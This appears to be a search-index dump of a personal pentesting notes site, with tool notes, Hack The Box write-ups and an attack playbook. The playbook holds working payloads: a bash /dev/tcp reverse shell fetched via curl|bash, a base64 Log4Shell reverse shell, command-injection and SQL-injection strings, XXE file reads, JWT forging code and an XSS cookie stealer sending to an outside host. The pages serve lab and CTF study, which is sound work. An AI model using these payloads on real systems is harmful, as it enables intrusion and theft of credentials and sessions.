&quot;C:\\Windows\\system32\\drivers\\etc\\hosts&quot; -Encoding byte))   ","version":"Next","tagName":"h2"},{"title":"Calculate MD5 hash​","type":1,"pageTitle":"powershell","url":"/docs/tooling/powershell#calculate-md5-hash","content":" Get-FileHash &quot;C:\\Windows\\system32\\drivers\\etc\\hosts&quot; -Algorithm MD5 | select Hash   ","version":"Next","tagName":"h2"},{"title":"Alternative to grep​","type":1,"pageTitle":"powershell","url":"/docs/tooling/powershell#alternative-to-grep","content":" Select-String -Path &quot;file.txt&quot; -Pattern &quot;searchTerm&quot;   ","version":"Next","tagName":"h2"},{"title":"Alternative to wc -l​","type":1,"pageTitle":"powershell","url":"/docs/tooling/powershell#alternative-to-wc--l","content":" Get-Content file.txt | Measure-Object -Line  ","version":"Next","tagName":"h2"},{"title":"rsa-ctf-tool","type":0,"sectionRef":"#","url":"/docs/tooling/rsa-ctf-tool","content":"rsa-ctf-tool https://github.com/RsaCtfTool/RsaCtfTool Is a tool to check/attack RSA keys. I have used it to retrieve a private key from a weak RSA public key. The key pair are generated by multiplying two prime numbers, if the prime numbers are not big enough, they can be guessed and reveal the private key. To decypher the file encrypted with the private key use openssl: openssl rsautl -in flag.enc -out flag.txt -decrypt -inkey key.priv To know the length of the RSA: openssl rsa -in key.pub --RSAPublicKey_in -text -noout openssl rsa -in key.priv -text -noout ","keywords":"","version":"Next"},{"title":"rdp","type":0,"sectionRef":"#","url":"/docs/tooling/rdp","content":"rdp Stands for Remote Desktop Protocol and runs on port 3389. To connect, you can use Windows tool or if in Linux, xfreerdp or any other alternative. xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.201.55 /timeout:10000 Setting the timeout will help when connection is unstable. If checking a Windows machine, try first the Administrator user. You can mount folder over RDP: xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer To access the directory, we can connect to \\tsclient\\ in the Windows machine. Enable clipboard: +clipboard, e.g: xfreerdp /v:10.129.202.146 /u:htb-student_adm /p:Academy_student_DA! +clipboard /timeout:10000 To enable smart-sizing and ease of use with i3 windows manager, one can use the following command with options: xfreerdp3 /u:Administrator /p:&quot;pwd&quot; /v:10.129.229.26 /smart-sizing /floatbar -grab-keyboard or xfreerdp3 /u:Administrator /p:&quot;pwd&quot; /v:10.129.229.26 /size:99% -grab-keyboard ","keywords":"","version":"Next"},{"title":"smbclient","type":0,"sectionRef":"#","url":"/docs/tooling/smbclient","content":"smbclient Stands for Server Message Block and is a protocol for file sharing between computers. It runs on port 445 by default. The command line tool to interact with it, it's smbclient. To list shared directories (use -N for anonymous access): smbclient -L \\\\&lt;ip&gt; -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC WorkShares Disk SMB1 disabled -- no workgroup available Note the \\\\ prefix, this comes from Windows slahes. Make sure to pass the --user flag, otherwise it will try to connect using your Linux user: smbclient -L \\\\10.129.68.251 --user=&quot;Administrator&quot; Password for [WORKGROUP\\Administrator]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Now, let's connect to the shared: smbclient \\\\\\\\&lt;ip&gt;\\\\WorkShares Enter WORKGROUP\\gal's password: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; When you're connected to the smb server you can use the same commands as in FTP. If you see this error: protocol negotiation failed: NT_STATUS_NOT_SUPPORTED, you need to configure min/max protocol versions, see: https://unix.stackexchange.com/questions/562550/smbclient-protocol-negotiation-failed We can download files with get and mget (for multiples files)","keywords":"","version":"Next"},{"title":"wesg","type":0,"sectionRef":"#","url":"/docs/tooling/wesg","content":"wesg https://github.com/bitsadmin/wesng Checks for Windows vulnerabilities given the output of a systeminfo command.","keywords":"","version":"Next"},{"title":"redis","type":0,"sectionRef":"#","url":"/docs/tooling/redis","content":"redis Redis is an in-memory key-value (NoSQL) database running on 6379 port by default To connect to the database, we must use redis-cli: redis-cli -h &lt;ip&gt; Once inside we can retrieve more information by using the info command: &lt;ip&gt;:6379&gt; info # Server redis_version:5.0.7 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:66bd629f924ac924 redis_mode:standalone os:Linux 5.4.0-77-generic x86_64 arch_bits:64 To enumerate the database with some entries, we can use the info keyspace command. This information is present in the info response as well. To retrieve all the keys in a given database, we can use the keys * command once we have selected the database. To access a particular key, we use the get command: redis-cli -h &lt;ip&gt; &lt;ip&gt;:6379&gt; select 0 OK &lt;ip&gt;:6379&gt; keys * 1) &quot;numb&quot; 2) &quot;temp&quot; 3) &quot;flag&quot; 4) &quot;stor&quot; &lt;ip&gt;:6379&gt; keys flag 1) &quot;flag&quot; &lt;ip&gt;:6379&gt; get flag &quot;flag&quot; ","keywords":"","version":"Next"},{"title":"responder","type":0,"sectionRef":"#","url":"/docs/tooling/responder","content":"responder https://github.com/lgandx/Responder For getting NTLM password, responder tool will setup a rogue SMB server that will capture the challenge initiated by another machine in the network and store the hash of the challenge. Later you can use hashcat or john to try to go from hash to password. sudo responder -I tun0 ","keywords":"","version":"Next"},{"title":"Criticalops","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/critical-ops","content":"Criticalops https://app.hackthebox.com/challenges/Criticalops Criticalops is a web app used to monitor critical infrastructure in the XYZ region. Users submit tickets to report unusual behavior. Please uncover potential vulnerabilities, and retrieve the hidden flag within the system. The first thing we see is a self-signed certificate, which might be interesting to explore. Whatweb reveals it is nextjs: https://94.237.50.221:51712/ [200 OK] Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.26.3], IP[94.237.50.221], Script, Title[CriticalOps - Infrastructure Management], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js], nginx[1.26.3] We can register and see dashboards and so on. Cannot do much, just a form to create tickets. This might be a good opportunity for XSS or something related with forms. In the ticket section, we can see a JWT token passed, decoding it we see: { &quot;userId&quot;: &quot;15f0d261-88f0-4092-bbe9-6990b0bf9cfc&quot;, &quot;username&quot;: &quot;test&quot;, &quot;role&quot;: &quot;user&quot;, &quot;iat&quot;: 1754239502, &quot;exp&quot;: 1754268302 } We could try a JWT Confussion attack to be able to modify it maybe. We can modify the token and sign it with the public key because we have the certificate info. We can download the certificate and extract the public key using openssl. curl -k 'https://94.237.54.192:57646/api/tickets' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: /' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Referer: https://94.237.54.192:57646/tickets' -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJiMTQ1NGQ1ZC1mM2ZmLTQ3ZjItODU4YS1mNDNhODdjNWM1ODMiLCJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidGVzdCIsImlhdCI6MTg1NDMyMTQ2MiwiZXhwIjoxODU0MzUwMjYyfQ.' -H 'Content-Type: application/json' -H 'Connection: keep-alive' -H 'Cookie: authToken=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJiMTQ1NGQ1ZC1mM2ZmLTQ3ZjItODU4YS1mNDNhODdjNWM1ODMiLCJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidGVzdCIsImlhdCI6MTg1NDMyMTQ2MiwiZXhwIjoxODU0MzUwMjYyfQ.' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'Priority: u=4' No luck with the confussion attack. Let's check the source code. It looks like the secret to generate the JWT token is included in the source code. We can generate a JWT with role &quot;admin&quot; using the secret and boom, we got the token. Remember, if available, check the code for secrets!","keywords":"","version":"Next"},{"title":"Useful links","type":0,"sectionRef":"#","url":"/docs/useful-links","content":"Useful links Name\tDescription\tLinkpentestbook.six2dez.com\tGeneral guides on pentesting\thttps://pentestbook.six2dez.com/ revshells\tList of reverse shells\thttps://www.revshells.com Hacktricks\tUseful for everything related with pentesting\thttps://book.hacktricks.xyz/welcome/readme SecLists\tWordlists and stuff\thttps://github.com/danielmiessler/SecLists Reverse shells\tMore reverse shells payloads\thttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Pentestmonkey\tAnother pentesting guide\thttps://pentestmonkey.net/ GTFOBins\tList of UNIX binaries that can be used to bypass local security restrictions\thttps://gtfobins.github.io/ LOLbas\tSimilar to GTFObins but for Windows\thttps://lolbas-project.github.io/ Red team notes\tRed team notes\thttps://www.ired.team/ SQL injections\tSQL injections\thttps://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/ CVE mitre\tSearch for CVEs\thttps://cve.mitre.org/cve/search_cve_list.html Request repo\tTool to receive HTTP request and display data\thttps://requestrepo.com/ CTF 101\tCTF theory\thttps://ctf101.org/","keywords":"","version":"Next"},{"title":"Distract and destroy","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/distract-and-destroy","content":"","keywords":"","version":"Next"},{"title":"Intro to Ethereum​","type":1,"pageTitle":"Distract and destroy","url":"/docs/write-up/htb/challenges/distract-and-destroy#intro-to-ethereum","content":" In Ethereum network, there are two types of accounts:  Externally Owned Account (EOA): human powered that has a private key and can initiate transactionsSmart contract: It is controller by code. Only can respond to calls, cannot initiate transactions and does not have a private key.  When a transaction is made:  EOA Call:  msg.sender = your EOA address tx.origin = your EOA address  Contract Call (via another contract):  You call Contract A (as an EOA), and it calls Contract B.  In Contract B:  msg.sender = Contract A tx.origin = your EOA address  In our case, the first caller set the aggro address:  if (aggro == address(0)) { aggro = msg.sender; }   Life points are only drained if offBalance and the sender is different that the first attacker  if (_isOffBalance() &amp;&amp; aggro != msg.sender) { lifePoints -= _damage; } else { lifePoints -= 0; }   offBalance happens on this case:   function _isOffBalance() private view returns (bool) { return tx.origin != msg.sender; }   tx.origin is transaction origin, since transactions can only be initiated by EOA, this is true only if the call is made from a contract (i.e., not directly from an EOA). So only contract calls (not direct user transactions) can damage the Creature.  So, we need to create two things:  A EOA that calls attack and sets aggro to the EOA. No damage will happen because isOffBalance will be false.A smart contract that calls the attack and drain the life points.  Once the life points are done, we can use the UI to perform the attack and reveal the flag. ","version":"Next","tagName":"h2"},{"title":"telnet","type":0,"sectionRef":"#","url":"/docs/tooling/telnet","content":"telnet Telnet is a very old way of connecting to computer and by default listens on port 23. Usage: telnet &lt;ip&gt; The prompty will ask for user/password: telnet &lt;ip&gt; Trying &lt;ip&gt;... Connected to &lt;ip&gt;. Escape character is '^]'. █ █ ▐▌ ▄█▄ █ ▄▄▄▄ █▄▄█ ▀▀█ █▀▀ ▐▌▄▀ █ █▀█ █▀█ █▌▄█ ▄▀▀▄ ▀▄▀ █ █ █▄█ █▄▄ ▐█▀▄ █ █ █ █▄▄ █▌▄█ ▀▄▄▀ █▀█ Meow login: root ","keywords":"","version":"Next"},{"title":"Low logic","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/low-logic","content":"Low logic https://app.hackthebox.com/challenges/Low%20Logic I have this simple chip, I want you to understand how it's works and then give me the output. A basic analysis treating the transistors as a simple switch will give us what the circuit is doing: i1 AND i2 OR i3 AND i4. Now we can create a python program that reads the input.csv binary input, generate the binary output and then convert the binary sequence to an ASCII sequence that will be the key: import csv bits = [] with open(&quot;./input.csv&quot;, 'r') as fd: reader = csv.reader(fd) next(reader) for row in reader: i1,i2,i3,i4 = map(int,row) o0 = (i1 &amp; i2) | (i3 &amp; i4) bits.append(o0) # Step 1: Group bits into chunks of 8 chunks = [bits[i:i+8] for i in range(0, len(bits), 8)] # Step 2: Convert each chunk to a character ascii_string = ''.join(chr(int(''.join(map(str, chunk)), 2)) for chunk in chunks) print(ascii_string) ","keywords":"","version":"Next"},{"title":"Pentesting","type":0,"sectionRef":"#","url":"/docs/playbooks/pentesting","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#enumeration","content":" Using nmap the attacker needs to see what is open in the target machine.  At this stage, we'll behave like a legitimate user, e.g.: perform regular searches, etc...  ","version":"Next","tagName":"h2"},{"title":"Web enumeration​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#web-enumeration","content":" If nmap shows some web server, it's worth to check the following enumeration techniques.  Directory brute-foce​  This is a technique to discover all public paths of a website. There might situation where the web server is serving something but it's not referenced anywhere on the website. This is know as well as dir busting.  The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (e.g. 200 OK) answer to the page. If so, we have discovered a page in that path.  There are many tools to perform this such as gobuster and ffuf.  You can use as well the sitemap functionality in the burp suite.  Sub-domain brute force​  This techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server.  Usually this works by providing values in the HTTP Host header.  There are many tools to perform this such as gobuster and ffuf.  Robots.txt​  It's always interesting to check the contents of robots.txt, for instance here, the file reveals the server hosts a joomla CMS:  # If the Joomla site is installed within a folder # eg www.example.com/joomla/ then the robots.txt file # MUST be moved to the site root # eg www.example.com/robots.txt # AND the joomla folder name MUST be prefixed to all of the # paths. # eg the Disallow rule for the /administrator/ folder MUST # be changed to read # Disallow: /joomla/administrator/ # # For more information about the robots.txt standard, see: # https://www.robotstxt.org/orig.html User-agent: * Disallow: /administrator/ Disallow: /api/ Disallow: /bin/ Disallow: /cache/ Disallow: /cli/ Disallow: /components/ Disallow: /includes/ Disallow: /installation/ Disallow: /language/ Disallow: /layouts/ Disallow: /libraries/ Disallow: /logs/ Disallow: /modules/ Disallow: /plugins/ Disallow: /tmp/   It also gives an idea of possible paths into the application  Whatweb​  https://github.com/urbanadventurer/WhatWeb  This program will output a list of technologies used in the website by reading the HTTP response headers, etc...  └─$ whatweb https://github.com/urbanadventurer/WhatWeb https://github.com/urbanadventurer/WhatWeb [200 OK] Cookies[_gh_sess,_octo,logged_in], Country[UNITED STATES][US], Email[banner@2x.png,nk@dsigned.gr,snoo-home@2x.png], HTML5, HTTPServer[GitHub.com], HttpOnly[_gh_sess,logged_in], IP[140.82.121.3], Open-Graph-Protocol[object][1401488693436528], OpenSearch[/opensearch.xml], PoweredBy[WordPress,[PHP/5,[phpBB],,abc,abc\\,abc\\&amp;quot;,phpBB,phpBB&amp;quot;], Script[application/javascript,application/json], Strict-Transport-Security[max-age=31536000; includeSubdomains; preload], Title[GitHub - urbanadventurer/WhatWeb: Next generation web scanner], UncommonHeaders[x-content-type-options,referrer-policy,content-security-policy,x-github-request-id], probably WordPress, X-Frame-Options[deny], X-XSS-Protection[0]   ","version":"Next","tagName":"h3"},{"title":"SMB enumeration​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#smb-enumeration","content":" If nmap show the Sambda related ports, see: https://www.cyberciti.biz/faq/what-ports-need-to-be-open-for-samba-to-communicate-with-other-windowslinux-systems/  You can try to enumerate the Sambda shared and check if they can be accessed anonimously.  smbclient -L \\\\&lt;ip&gt; -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC WorkShares Disk SMB1 disabled -- no workgroup available   Check smbclient for reference  ","version":"Next","tagName":"h3"},{"title":"Breaking in​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#breaking-in","content":" This stage is the most varied one, the idea is to find a vulnerability to get to a shell into the machine, no matter if the user is privileged or not.  At this point, you should have a list of services (and versions) that are running in the machine. You can do a google query with the service you want to discover vulnerabilities.  The attack vector is different to each machine, here you can find most common vector attacks  ","version":"Next","tagName":"h2"},{"title":"Anonymous access​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#anonymous-access","content":" The user might have ftp or tftp or smb shares with anonymous access. It's worth taking a look because those access might leak some valuable information. Additionally, you can also check metasploit to check for this kind of access.  ","version":"Next","tagName":"h3"},{"title":"Command injection​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#command-injection","content":" Uncontrolled inputs that are used to invoke OS command can lead to arbitrary execution.  Usually this can be achieved by using several console characters such as:  #Both Unix and Windows supported ls||id; ls ||id; ls|| id; ls || id # Execute both ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe) ls&amp;&amp;id; ls &amp;&amp;id; ls&amp;&amp; id; ls &amp;&amp; id # Execute 2º if 1º finish ok ls&amp;id; ls &amp;id; ls&amp; id; ls &amp; id # Execute both but you can only see the output of the 2º # \\n character executes each command ls id # %0A is \\n url-encoded: ls %0A id # is the same as # ls # id # \\t serves as a replacement for white-spaces echo &quot;1234&quot; # is the same as echo(\\t)1234 #Only unix supported `ls` # `` $(ls) # $() ls; id # ; Chain commands ls${LS_COLORS:10:1}${IFS}id # Might be useful #Not executed but may be interesting &gt; /var/www/html/out.txt #Try to redirect the output to a file &lt; /etc/passwd #Try to send some input to the command   See https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses  ","version":"Next","tagName":"h3"},{"title":"Guess/Brute force credentials​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#guessbrute-force-credentials","content":" If you discover a login page, why not trying some default user/password combinations? Try the following user/password combinations first:  admin:adminadministrator:administratoradmin:administratoradmin:passwordadministrator:password...  If you are login to a third-party applications it's wise to do a google search for default credentials.  You can try a dictionary attack to bruce force user/password combinations.  You can use a tool like thc-hydra. However, this will fail if there if there's any kind of CSRF protection.  ","version":"Next","tagName":"h3"},{"title":"SQL Injection​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#sql-injection","content":" Poorly programmed queries can be very dangerous and leads to escaping issues in the queries.  If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.  A typical SQL query for a login page can look like this:  SELECT * FROM members WHERE username = 'admin' AND password = 'admin'   If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:  SELECT * FROM members WHERE username = 'admin' #' AND password = 'kjdfjklsdf'   Now the query becomes:  SELECT * FROM members WHERE username = 'admin'   therefore, the query is no longer checking for password and the login page is bypassed.  Pay attention when breaking the rest of the query with comments. The standard comment -- might not always work, it's worth trying another kind of comments like #. Also, you might want to URL encode the escaping characters.  SQL injections reference: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet  ","version":"Next","tagName":"h3"},{"title":"Server side template injection (SSTI)​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#server-side-template-injection-ssti","content":" if you see a search form and you type something and you see the output of what you typed again in the webpage, the webpage might be susceptible for SSTI. Try to identify which template engine and search how to exploit it.  If the target is using a templating engine, it is possible to use the template injection to execute commands in the server.  One easy way to test that is to put something like {{7*7}} in the template and check for the result.  If the template executes, we'll see the result, out of luck we will see nothing. Or maybe we'll see some trace that reveals the technology behind.  ","version":"Next","tagName":"h3"},{"title":"Arbitrary file upload​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#arbitrary-file-upload","content":" This is a very interesting vulnerability. It lets the attacker upload some file to the server. You can do this to start a reverse shell. That is the targeted machine establish a permanent connection to the attacker machine and it provides a shell where the attacker can run commands as if it was inside the machine.  ","version":"Next","tagName":"h3"},{"title":"File inclusion (LFI,RFI)​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#file-inclusion-lfirfi","content":" Some pages include other pages in order to improve re-usability, e.g. header and footer. If this is not configured properly, an attacker can use the include functionality to read local files.  http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts   You can try to read the following files for Linux:  /etc/hosts/etc/passwd  and for Windows:  C:/Windows/System32/drivers/etc/hostsc:/windows/win.ini  Depending on the inclusion it might lead to Remote File Inclusion, which is execute remote files.  This can be used for example to force the target make a call to a compromised host in the same network and capture the credentials challenge:  http://unika.htb/index.php?page=\\\\10.1.2.3\\blabla\\   ","version":"Next","tagName":"h3"},{"title":"Reverse shell ​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#reverse-shell-","content":" Reverse basically means that it is the target that will initiate a connection request back us (the attacker).  For example, once we have remote code execution in the target, we'll be able to download and execute a piece of code.  Usually the process is:  Create a file in the attacker machine containing a reverse shell payload:  #!/bin/bash bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP_ADDRESS&gt;/1337 0&gt;&amp;1   Create a server in the attacker machine which will act as the shell I/O. Normally this is done with netcat.  nc -nvlp 1337   Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):  python3 -m http.server 8000   Make the target machine download and execute the reverse shell payload:  http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash   You can find a list of reverse shells here: https://www.revshells.com/  Once you have shell access, most likely it will not be interactive and you'll miss many functionalities. You can try to get a improve the shell if python is installed:  python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' CTRL+Z stty raw -echo fg export TERM=xterm   Or, you can find mmore methods to improve the shell here https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/  ","version":"Next","tagName":"h3"},{"title":"Rogue servers ​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#rogue-servers-","content":" The idea of rogue server is to start a server in the attacker machine and make the target machine speak with the attacker server. This is used for instance to retrieve NTLM hash challenge or to explot log4j vulnerability.  NTLM ​  Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.  In order to mess with it, you might use the responder tool.  The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by responder tool). This tool will capture the authentication challenge hash and then you can use john tool to compare the hash with a dictionary to see if any entry matches.  Log4jShell ​  It was discovered that log4j libraries for certain versions were vulnerable to remote code execution. In order to do so, you setup a rogue JNDI/LDAP server from https://github.com/veracode-research/rogue-jndi in the attacker machine and send a JNDI command to the target machine to communicate with the rogue LDAP server to get a revershe shell on the attacker machine.  E.g.:  java -jar target/RogueJndi-1.1.jar --command &quot;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,- d}|{bash,-i}&quot; --hostname &quot;10.10.14.33&quot;   Start the rogue JNDI server that will start a reverse shell on 10.10.14.33 using the base64 payload provided.  Then, send the payload to force the target machine connect the rogue JNDI/LDAP server:  ${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}   ","version":"Next","tagName":"h3"},{"title":"XML eXternal Entities (XXE)​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#xml-external-entities-xxe","content":" If the application is using XML to process any input data, it might be vulnerable to this kind of attacks.  This attack works because the XML parsers usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.  In order to check if the machine is vulnerable to this attack, you can try to show the contents of /etc/hosts(Linux) or C:/Windows/System32/drivers/etc/hosts(Windows). e.g.:  &lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot; &gt;]&gt; &lt;order&gt;&lt;quantity&gt;2&lt;/quantity&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;address&gt;Fake street 1234&lt;/address&gt;&lt;/order&gt;   ","version":"Next","tagName":"h3"},{"title":"JWT Key confussion attack​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#jwt-key-confussion-attack","content":" JWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc...  They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.  This signing and verifing is very important because it ensures that nobody modifies the tokens.  However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we're using symmetric algorithm.  See the following example:  In the received side, the token is verified using symmetric and asymmetric algorithms:  async decode(token) { return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] })); }   First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.  This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:  const fs = require('fs'); const jwt = require('jsonwebtoken'); const publicKey = fs.readFileSync('./public.key', 'utf8'); const validJwtToken = fs.readFileSync('./jwt-token.txt', 'utf8'); decoded = jwt.verify(validJwtToken, publicKey, { algorithms: [&quot;RS256&quot;]}) decoded[&quot;username&quot;] = &quot;admin' AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage -- -&quot; re_encoded = jwt.sign(decoded, publicKey, {algorithm: 'HS256'}) console.log(re_encoded)   Here, we are using the public key to verify the received token, as the regular way.  Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the receiver will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.  In this case, we are modifying the token to retrieve something from the database using an SQL injection.  ","version":"Next","tagName":"h3"},{"title":"Cross-Site Scripting (XSS) ​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#cross-site-scripting-xss-","content":" This is a massive vulnerability. It consist on a web application accepting input from the user. If the input is not sanitized, the attacker might be able to write HTML in the input form. This HTML can include malicious javascript code.  Let's imagine we have an application with a form with no sanitized input. On another view we list that input. An attacker can place JS code that will be executed in the other view.  E.g.  Create a payload file that will send the interesting data (in our case, we want to extract something from the cookie):  fetch(&quot;https://ojm5l9c8.requestrepo.com/?&quot; + document.cookie);   Write the XSS HTML code in the input form field:  &lt;script src=https://cdn.jsdelivr.net/gh/adriangalera/htb-cursed-secret-party-xss@master/xss.js&gt;&lt;/script&gt;   In the remote url (requestrepo), you'll see the value of the document.cookie  There's a security header in modern browsers to prevent this Content Security Policy (CSP). However, if you are unlucky enough to include a CDN in that header, you are still vulnerable since one can put arbitrary code in the CDN.  ","version":"Next","tagName":"h3"},{"title":"Cookie hijacking​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#cookie-hijacking","content":" If you see the application has some cookies and you somehow got access to a privileged cookie, you just need to change it in your browser and you'll access as the privileged user.  ","version":"Next","tagName":"h3"},{"title":"Foothold, we are in​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#foothold-we-are-in","content":" At this point we have shell (or reverse) access to the target machine. Now we are in the machine, but we don't have much access, probably we're logged in as a user that can't do much and have access to few places.  ","version":"Next","tagName":"h2"},{"title":"List users and groups​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#list-users-and-groups","content":" We might discover other users of the machine.  In Linux, you can query all the available users in the target by querying /etc/passwd.  To retrieve the details about the current shell user, you can do id command. It will list the groups that the user belong. This might be useful for privilege escalation.  You can also list the binaries the user or group has access:  find / -group bugtracker 2&gt;/dev/null   ","version":"Next","tagName":"h3"},{"title":"Search for interesting keywords​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#search-for-interesting-keywords","content":" You can search inside the contents of files for interesting contents (passwords):  Let's image someone decided to hardcode a username/password in one file in a web server. You can find it checking the files one by one or, you can use grep to search all files for interesting keywords:  grep -Ril 'passwd*' /var/www/html   -R recursive-i ignore case-l show the file, not the match  ","version":"Next","tagName":"h3"},{"title":"Local port forwarding​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#local-port-forwarding","content":" Imagine you gain access to a machine which is running a service only for localhost. You can make that service available outside localhost by doing local port forwarding. e.g funnel.htb server is running postgres on port 5432.  With the next command, we'll do a SSH tunnel between localhost:5432 and funnel.htb:5432 port  ssh -L 5432:localhost:5432 christine@funnel.htb   and now you can access funnel.htb:5432 in localhost:5432  ","version":"Next","tagName":"h3"},{"title":"Lateral movement​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#lateral-movement","content":" Normally when the attacker get shell acess, the user has very few permissions. The attacker should check for credentials (inside database, inside files), etc... to switch from a low-permission user to a user with more permissions. That's called lateral movement and it's a step forward privilege escalation.  Also part of lateral movement is to use the machine as a pivot to enumerate more network devices. Typically this is done for enterprise level pentesting. Once a machine is compromised, you can access the machines in the same network even if they don't have public access.  Once we got shell access to a machine, it might be worth to try to retrieve the SSH private keys for the user. In order to do so, we must check the .ssh folder in the user home:  /home/michael/.ssh/id_rsac/users/daniel/.ssh/id_rsa  Paste the contents of that private key into the attacker machine and run:  chmod 400 michael-id-rsa ssh -i michael-id-rsa michael@target.htb   An interesting option for lateral movement is checking the values set in the environment variables:  5d711b9d670a:/metabase.db$ env env SHELL=/bin/sh MB_DB_PASS= HOSTNAME=5d711b9d670a LANGUAGE=en_US:en MB_JETTY_HOST=0.0.0.0 JAVA_HOME=/opt/java/openjdk MB_DB_FILE=//metabase.db/metabase.db PWD=/metabase.db LOGNAME=metabase MB_EMAIL_SMTP_USERNAME= HOME=/home/metabase LANG=en_US.UTF-8 META_USER=metalytics META_PASS=An4lytics_dsXXXX# MB_EMAIL_SMTP_PASSWORD= USER=metabase SHLVL=4 MB_DB_USER= FC_LANG=en-US LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib LC_CTYPE=en_US.UTF-8 MB_LDAP_BIND_DN= LC_ALL=en_US.UTF-8 MB_LDAP_PASSWORD= PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin MB_DB_CONNECTION_URI= 